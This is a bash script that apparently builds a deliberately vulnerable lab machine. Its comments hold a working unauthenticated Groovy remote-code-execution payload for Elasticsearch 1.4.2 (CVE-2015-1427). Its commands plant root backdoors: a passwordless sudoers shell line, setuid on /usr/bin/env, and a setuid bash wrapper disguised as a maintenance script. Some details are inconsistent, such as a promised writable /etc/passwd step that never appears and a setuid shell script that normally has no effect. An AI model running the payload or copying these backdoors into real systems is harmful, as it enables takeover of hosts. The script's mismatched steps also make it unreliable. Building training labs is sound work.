#!/bin/bash
# CVE-2015-1427: Elasticsearch 1.4.2 Groovy sandbox escape
# Foothold: RCE as elasticsearch user via Groovy script execution
# Exploit via ES search API (no auth required):
#   curl -XPOST 'http://TARGET/_search?pretty' -H 'Content-Type: application/json' -d '{
#     "size": 1,
#     "script_fields": {
#       "output": {
#         "script": "import java.io.*;def cmd=\"id\".execute();def out=new StringBuilder();cmd.consumeProcessOutput(out,out);cmd.waitFor();out.toString()"
#       }
#     }
#   }'
# Simpler PoC (Groovy inline):
#   "script": "def cmd='id'.execute(); cmd.waitFor(); cmd.text"
#
# Privesc: elasticsearch -> ckplayer (sudo), ckplayer -> root (writable /etc/passwd trick)
# Difficulty: Hard - requires crafting correct Groovy bypass for newer restrictions

# Create elasticsearch user for process
id elasticsearch &>/dev/null || useradd -r -s /bin/bash -m -d /usr/share/elasticsearch elasticsearch

# elasticsearch user -> ckplayer via sudo
echo "elasticsearch ALL=(ckplayer) NOPASSWD:/bin/bash" >> /etc/sudoers

# /etc/passwd is world-readable, /etc/shadow is restricted
# Challenge: make ckplayer -> root via a subtle SUID + env variable trick
chmod u+s /usr/bin/env 2>/dev/null || true
# OR: create a SUID script wrapper
cat > /usr/local/bin/sysupdate << 'EOF'
#!/bin/bash
# system maintenance script
/bin/bash
EOF
chmod 4755 /usr/local/bin/sysupdate

# Ensure ES data directory is writable
mkdir -p /usr/share/elasticsearch/data /usr/share/elasticsearch/logs
chown -R elasticsearch:elasticsearch /usr/share/elasticsearch/data \
    /usr/share/elasticsearch/logs /usr/share/elasticsearch/config 2>/dev/null || true
